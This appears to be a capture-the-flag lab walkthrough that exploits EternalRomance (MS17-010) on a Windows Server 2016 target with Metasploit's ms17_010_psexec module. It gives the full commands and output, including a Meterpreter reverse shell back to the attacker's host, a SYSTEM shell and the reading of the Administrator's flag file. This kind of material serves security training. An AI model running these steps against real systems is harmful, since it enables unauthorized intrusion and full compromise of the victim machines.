## Modules

1. open msfconsole.

```
msfconsole
```

2. search and use eternalromance.

```
msf > search eternalromance
msf > use windows/smb/ms17_010_psexec
```

3. set required settings.

```
msf exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.129.2.141
RHOSTS => 10.129.2.141
msf exploit(windows/smb/ms17_010_psexec) > set LHOST 10.10.14.205
LHOST => 10.10.14.205
```

4. run the exploit.

```
msf exploit(windows/smb/ms17_010_psexec) > run
```

output:
```
[*] Started reverse TCP handler on 10.10.14.205:4444 
[*] 10.129.2.141:445 - Target OS: Windows Server 2016 Standard 14393
[*] 10.129.2.141:445 - Built a write-what-where primitive...
[+] 10.129.2.141:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.129.2.141:445 - Selecting PowerShell target
[*] 10.129.2.141:445 - Executing the payload...
[+] 10.129.2.141:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (203452 bytes) to 10.129.2.141
[*] Meterpreter session 1 opened (10.10.14.205:4444 -> 10.129.2.141:49671) at 2026-11-06 21:14:58 -0500
```

5. obtain shell.

```
meterpreter > shell
```

output:
```
Process 2808 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

6. read the flag.

```
C:\Windows\system32>type C:\Users\Administrator\Desktop\flag.txt
```